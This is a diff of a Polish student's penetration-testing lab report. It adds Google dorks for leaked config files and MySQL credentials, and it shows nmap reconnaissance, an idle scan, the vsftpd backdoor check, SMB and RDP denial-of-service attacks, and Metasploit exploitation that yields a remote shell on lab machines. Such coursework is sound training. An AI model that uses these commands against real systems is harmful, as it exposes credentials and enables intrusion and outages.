@@ -2,8 +2,9 @@ Robert Bielas, hasełko: 9724e90f1f17
 ================================================================
 OSINT
 przeglądnij różne istniejące zapytania. Spróbuj użyć kilku i zastanów się nad wynikami.
-np. ext:txt | ext:conf | ext:inc | ext:doc intext:php class JConfig - pliki konfiguracyjne wrzucone przez google dorki
-lub inurl:/Divi/Changelog.txt /Divi/Changelog.txt - "juicy info"
+ext:txt | ext:conf | ext:inc | ext:doc intext:php class JConfig - pliki konfiguracyjne wrzucone przez google dorki
+inurl:/Divi/Changelog.txt /Divi/Changelog.txt - "juicy info"
+filetype:tpl intext:mysql_connect - dane logowania mysql w php template file
 
 "google dorking" lub google hacking może zwrócić informacje które są trudne do odnalezienia
 poprzez proste frazy w przeglądarce. Może zwracać dane osobowe lub hasła, prywatne dokumenty itp.
@@ -24,7 +25,7 @@ renewal date:          2017.12.31 13:00:00
 
 
 -> lub dla dnsrecon, żeby wykonać ściągnąć repo, dociągnąć co trzeba przez pip 
-i wykonać python dnsrecon -d ki.agh.edu.pl:
+i wykonać python dnsrecon -d ki.agh.edu.pl: (wybrałem -d do wyspecyfikowania domeny)
 [*] Performing General Enumeration of Domain: ki.agh.edu.pl
 [*] Checking for Zone Transfer for ki.agh.edu.pl name servers
 [*] Resolving SOA Record
@@ -147,16 +148,18 @@ i odpowiedziach na pytania mam słownik, ale haseł nie podam bo było kilka tra
 
 Host discovery
 1. Warstwa 2: Znajdź wszystkie hosty lokalne używając komendy nmap i jej parametru -sn. Wykrywanie hostów musi odbywać się za pomocą ARP.
-nmap -v --packet-trace -sn -Pn 172.16.129.0/0
+nmap -sn sieć_pom_wirtualkami
 2. Warstwa 3: Znajdź wszystkie działające w laboratorium hosty (sieć 172.16.129.0/0 lub 172.16.145.0/24) za pomocą komendy nmap i parametru -sn
-nmap -v --unprivileged  -sn 172.16.129.0/0
-nmap -v --unprivileged  -sn 172.16.145.0/24
+nmap  --unprivileged  -sn 172.16.129.0/0
+nmap  --unprivileged  -sn 172.16.145.0/24
 
 
 3. Warstwa 4: Znajdź wszystkie hosty lokalne za pomocą komendy nmap:
-UDP Ping na pierwsze 100 portów (-PU)  nmap -v --unprivileged  -sn -Pn -PU1-100 172.16.129.0/0
-TCP ACK Ping na pierwsze 100 portów (-PA): nmap -v --unprivileged  -sn -Pn  -PA1-100 172.16.145.0/24
+UDP Ping na pierwsze 100 portów (-PU)  nmap  -sn -PU1-100 sieć_pom_wirtualkami
+TCP ACK Ping na pierwsze 100 portów (-PA): nmap -sn  -PA1-100 sieć_pom_wirtualkami
 ================================================================
+Port Scanning
+
 1. Przeprowadź UDP scan zeskanuj za pomocą komendy nmap pierwsze 100 portów UDP (-sU) maszyny Metasploitable 2.
 nmap -sU -p 1-100 ip_maszyny
 2. Przeprowadź stealth scan (-sS) za pomocą nmap na pierwsze 100 portów TCP maszyny Metasploitable 2.
@@ -167,22 +170,32 @@ nmap -sT -p 1-100 ip_maszyny
 4.Przeprowadź idle scan:
 a) Zidentyfikuj hosty, które mają przyrostową sekwencję IPID.
 nmap --script ipidseq  172.16.129.0/0
+nmap --script ipidseq  172.16.145.0/24
+nmap --script ipidseq  sieć_lokalna_pom_wirtualkami
 b) Przeprowadź idle scan na Metasploitable 2 za pomocą jednego ze znalezionych hostów (-sI). Pamiętaj o tym, żeby unikać jakiejkolwiek interakcji z celem!
-nmap -P0 -p <port> -sI <zombie IP> ip_maszyny
+nmap -P0 -p <któryś port z zadania 1-3> -sI <zombie IP> ip_maszyny
 -sI - scan idle
 
 ================================================================
-1. Przeprowadź identyfikację usług (-sV) na pierwszych 100 portach maszyny za pomocą nmap.
-nmap -sV -p 1-100 ip_maszyny
+Fingerprinting
+1. Przeprowadź identyfikację usług (-sV) na najczęstszych portach za pomocą nmap.
+nmap -sV -p 80,22 ip_maszyny
 2. Przeprowadź identyfikację systemu operacyjnego (-O) za pomocą nmap.
 nmap -O ip_maszyny
 3. Przeprowadź identyfikację firewalla (-sA) za pomocą nmap na pierwszych 1000 portach.
 nmap -sA -p 1-1000 ip_maszyny
 
 ================================================================
+Wykrywanie podatności
+nmap
+
 Sprawdź za pomocą nmap czy maszyna Metasploitable jest podatna na vsFTPd 2.3.4 backdoor (CVE-2011-2523). Wykorzystaj w tym celu jeden ze skryptów NSE (Nmap Script Engine).
 nmap --script ftp-vsftpd-backdoor -p 21 ip_maszyny
 
+Maszyna jest podatna, co pokazuje tekst:
+ ftp-vsftpd-backdoor:
+   VULNERABLE
+   
 Zapoznaj się z opisem i sposobem działania podatności.
 Informacje o tej podatności mają status RESERVED  woficjalnej bazie CVE.
 Jednak z innych źródeł można dowiedzieć się, że exploit opiera się o backdoor dodany do pobieralnego archiwum VSFTPD (vsftpd-2.3.4.tar.gz) - wirus?
@@ -201,49 +214,66 @@ przeprowadź atak typu DoS na maszynę z Windows 7
 wykorzystując lukę Microsoft SMB Server Trans2 Zero
 Size Pool Alloc (MS10-054).
 nmap  -p 445 win7_ip --script=smb-vuln-ms10-054 --script-args unsafe
+odnośnik: https://github.com/nmap/nmap/blob/master/scripts/smb-vuln-ms10-054.nse
+
+Efekt exploita: 
 
 Zapoznaj się z opisem i sposobem działania podatności: 
 Exploit wykorzystuje niepoprawną obsługę ramek smb, tzn. brak walidacji jej pól. Atakujący może 
 przesłać syntetyczną ramkę SMB aby być w stanie zdalnie wykonać dowolny kod. 
 Oprócz tego mogą pojawić się objawy DoS (np. system się całkowicie zwiesza).
 ================================================================
+Metasploit Framework
+
 Używając modułu auxiliary/scanner/discovery/arp_sweep przeprowadź wykrywanie hostów w sieci lokalnej.
 
 1. 
 Najpierw wyświetl informacje o module za pomocą komendy info.
 Ustal, jakie zmienne musisz ustawić: SHOST, SMAC, RHOSTS (dla przyspieszenia: THREADS)
-Wybierz moduł za pomocą komendy use: use auxiliary/scanner/discovery/arp_sweep
+Wybierz moduł za pomocą komendy use
 Ustaw zmienne za pomocą serii komend set:
+
+use auxiliary/scanner/discovery/arp_sweep
 set SHOST my_mac
 set SMAC my_ip
-set RHOSTS 172.16.129.0-254
+set RHOSTS sieć_pom_wirtualkami
 run 
 back 
+
+Wyjaśnij, jaką metodą ten moduł przeprowadza skanowanie:
+przeprowadza metodą analogiczną do nmap -sn (odpytuje hosty o arpa, jeśli host jest "up", odpowie na pytanie whois)
 
 2.
 Przeprowadź skanowanie portów za pomocą modułów:
 a) auxiliary/scanner/discovery/udp_sweep:
 use auxiliary/scanner/discovery/udp_sweep
-set rhosts 172.16.129.0/24
+set rhosts sieć_pom_wirtualkami
 run
 back
+Mechanizm działania polega na wysyłaniu pakietów UDP, jeśli cel odpowie 
+na ramkę, znaczy że jest postawiony.
 
 b) auxiliary/scanner/portscan/syn: (robię dla pierwszych stu portów)
 use auxiliary/scanner/portscan/syn
-set rhosts 172.16.129.0/24
+set rhosts sieć_pom_wirtualkami
 set ports 1-100
 set threads 10
 run
 back
+
+podobnie jak nmap -PS: ustawia flagę SYN (sugestia chęci nawiązania połączenia),
+jeśli port celu jest otwarty odpowiada odpowiednio do 2 fazy procesu handshake.
 
 c) auxiliary/scanner/portscan/tcp:
 use auxiliary/scanner/portscan/tcp
-set rhosts 172.16.129.0/24
+set rhosts sieć_pom_wirtualkami
 set ports 1-100
 set threads 10
 run
 back
 
+Mechanizm działa poprzez próby nawiązania połączeń na określonym przedziale portów 
+TCP celu, jeśli cel odpowie na próbę nawiązania połączenia, to oznacza że jest aktywny
 ================================================
 
 3.  Sprawdź podatność Windows 7 na błąd MS12-020 (ms12_020_check). Następnie, jeżeli jest podatny, wykorzystaj tę lukę (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
@@ -294,6 +324,9 @@ f) Udowadniamy  że exploit zadziałał:
 	cd /root/.msf4/loot
 	ls -lrta
 	
+Efektem exploitu jest uzyskanie shella celu. Można w nim wykonywać
+dowolny kod (co prezentuje np. komenda ls)
+
 Zapoznaj się z opisem i sposobem działania podatności: 
 
 Exploit pozwala atakującemu na zdalne wykonanie dowolnego kodu,
